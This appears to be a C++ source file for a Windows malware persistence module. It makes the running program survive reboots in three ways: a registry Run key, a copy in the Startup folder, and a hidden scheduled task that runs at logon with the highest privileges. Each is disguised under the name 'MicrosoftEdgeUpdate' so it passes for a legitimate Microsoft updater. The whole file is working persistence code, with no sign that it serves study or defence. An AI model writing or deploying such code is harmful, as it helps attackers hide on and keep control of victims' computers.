#include "persist.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <fstream>
#include <sstream>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

namespace Persist {

bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}

static std::string GetSelfPath() {
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

static bool InstallRunKey() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        return false;
    std::string self = GetSelfPath();
    RegSetValueExA(hKey, "MicrosoftEdgeUpdate", 0, REG_SZ,
                   (const BYTE*)self.c_str(), (DWORD)self.size() + 1);
    RegCloseKey(hKey);
    return true;
}

static bool InstallStartupFolder() {
    char startup[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup) != S_OK)
        return false;
    std::string src = GetSelfPath();
    std::string dst = std::string(startup) + "\\MicrosoftEdgeUpdate.exe";
    return CopyFileA(src.c_str(), dst.c_str(), FALSE) != 0;
}

static bool InstallScheduledTask() {
    if (!IsAdmin()) return false;
    std::string self = GetSelfPath();
    std::string cmd = "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"" +
                      self + "\" /sc onlogon /rl highest /f";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    char buf[1024];
    strcpy_s(buf, cmd.c_str());
    if (!CreateProcessA(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return false;
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

bool Install() {
    bool ok = false;
    ok |= InstallRunKey();
    ok |= InstallStartupFolder();
    ok |= InstallScheduledTask();
    return ok;
}

}